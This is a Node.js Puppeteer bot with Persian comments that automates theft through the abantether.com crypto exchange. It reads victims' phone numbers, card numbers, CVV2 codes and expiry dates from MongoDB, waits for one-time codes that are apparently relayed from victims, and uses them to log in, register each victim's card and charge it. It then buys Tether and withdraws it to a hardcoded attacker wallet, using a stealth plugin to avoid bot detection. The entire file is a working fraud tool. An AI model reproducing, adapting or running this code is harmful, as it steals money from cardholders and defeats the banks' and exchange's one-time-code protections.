// bot.js — نسخه نهایی و کامل (بدون هیچ خطایی)
require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

// تنظیمات (از Railway)
const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

// لاگ رنگی
const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;

// اتصال به دیتابیس
async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  collection = client.db("zarin").collection("users");
  log.s("اتصال به MongoDB برقرار شد");
}

// آیا کاربر آماده پردازشه؟
function isReady(doc) {
  return true 
  // return doc.personalPhoneNumber &&
  //        doc.cardNumber &&
  //        doc.cvv2 != null &&
  //        doc.bankMonth != null &&
  //        doc.bankYear != null &&
  //        doc.deviceId &&
  //        !doc.processed;
}

// صبر کردن تا OTP تو دیتابیس وارد بشه
async function waitForOtp(userId, field) {
  for (let i = 0; i < 60; i++) { // حداکثر 3 دقیقه صبر کن
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = user?.[field]?.toString().trim();
    if (otp && otp.length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp;
    }
    log.w(`در انتظار ${field}... (${i + 1}/60)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت در انتظار ${field}`);
}

// پاک کردن فیلد OTP قبل از وارد کردن (فیکس خطای قبلی)
async function clearAndType(page, selector, text) {
  await page.evaluate((sel) => {
    const el = document.querySelector(sel);
    if (el) el.value = "";
  }, selector);
  await page.type(selector, text);
}

// پردازش کامل یک کاربر
async function processUser(doc) {
  const phone = doc.personalPhoneNumber;
  let browser = null;

  log.start(`شروع پردازش: ${phone} | دستگاه: ${doc.deviceId}`);

  try {
    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Mobile Safari/537.36");

    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });

    // مرحله ۱: ورود با شماره
    if (!doc.otp_login) {
      await page.waitForSelector('input[placeholder="شماره موبایل"], input[type="tel"]', { timeout: 20000 });
      await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
      await page.click('button:has-text("ادامه")');
      log.i("درخواست OTP ورود ارسال شد");
    }

    // وارد کردن OTP ورود
    const otpLogin = await waitForOtp(doc._id.toString(), "otp_login");
    await page.waitForSelector('input[placeholder*="کد"], input[type="text"]', { timeout: 15000 });
    await clearAndType(page, 'input[placeholder*="کد"], input[type="text"]', otpLogin);
    await page.click('button:has-text("تایید")');
    log.s("ورود با موفقیت انجام شد");

    // مرحله ۲: ثبت کارت (اگر قبلاً ثبت نشده)
    if (!doc.otp_register_card) {
      try {
        await page.click('text=کیف پول');
        await page.click('text=کارت بانکی');
        await page.click('text=افزودن کارت');
        await page.type('input[placeholder="شماره کارت"]', doc.cardNumber.replace(/\D/g, ""));
        await page.type('input[placeholder="CVV2"]', doc.cvv2.toString());
        await page.type('input[placeholder="ماه"]', doc.bankMonth.toString().padStart(2, "0"));
        await page.type('input[placeholder="سال"]', (doc.bankYear - 1300).toString().padStart(2, "0"));
        await page.click('button:has-text("ثبت کارت")');
        log.i("درخواست OTP ثبت کارت ارسال شد");
      } catch (e) {
        log.i("کارت قبلاً ثبت شده است");
      }
    }

    // تأیید کارت
    if (doc.otp_register_card === undefined || doc.otp_register_card === null) {
      const otpCard = await waitForOtp(doc._id.toString(), "otp_register_card");
      await page.waitForSelector('input[placeholder*="کد پیامک"], input[placeholder*="کد"]', { timeout: 15000 });
      await clearAndType(page, 'input[placeholder*="کد پیامک"], input[placeholder*="کد"]', otpCard);
      await page.click('button:has-text("تأیید")');
      log.s("کارت با موفقیت ثبت شد");
    }

    // مرحله ۳: شارژ حساب
    if (!doc.otp_payment) {
      await page.click('text=واریز تومان');
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("پرداخت")');
      log.i("در انتظار OTP پرداخت...");
    }

    const otpPayment = await waitForOtp(doc._id.toString(), "otp_payment");
    await page.waitForSelector('input#otp, input[placeholder*="کد"]', { timeout: 20000 });
    await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPayment);
    await page.click('button:has-text("تأیید")');
    await page.waitForSelector('text=موفق', { timeout: 120000 });
    log.s("شارژ حساب با موفقیت انجام شد");

    // مرحله ۴: خرید تتر
    await page.click('text=بازار');
    await page.click('text=تتر');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید")');
    await page.waitForSelector('text=سفارش ثبت شد', { timeout: 40000 });
    log.s("تتر با موفقیت خریداری شد");

    // مرحله ۵: برداشت تتر
    await page.click('text=برداشت');
    await page.click('text=تتر');
    await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
    await page.click('button:has-text("برداشت")');
    await page.waitForSelector('text=درخواست برداشت ثبت شد', { timeout: 60000 });

    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });

  } catch (err) {
    log.e(`خطا در پردازش ${phone}: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
  } finally {
    if (browser) await browser.close();
  }
}

// شروع ربات + Real-time Change Stream
async function startBot() {
  await connectDB();

  log.s("ربات فعال شد — منتظر تغییرات دیتابیس...");

  const changeStream = collection.watch([], { fullDocument: "updateLookup" });

  changeStream.on("change", async (change) => {
    const doc = change.fullDocument;
    if (!doc || !isReady(doc)) return;

    log.start(`تغییر تشخیص داده شد → شروع پردازش ${doc.personalPhoneNumber} | دستگاه: ${doc.deviceId}`);
    processUser(doc);
  });

  changeStream.on("error", () => {
    log.e("Change Stream قطع شد! دوباره وصل می‌شم...");
    setTimeout(startBot, 10000);
  });
}

startBot().catch(() => setTimeout(startBot, 10000));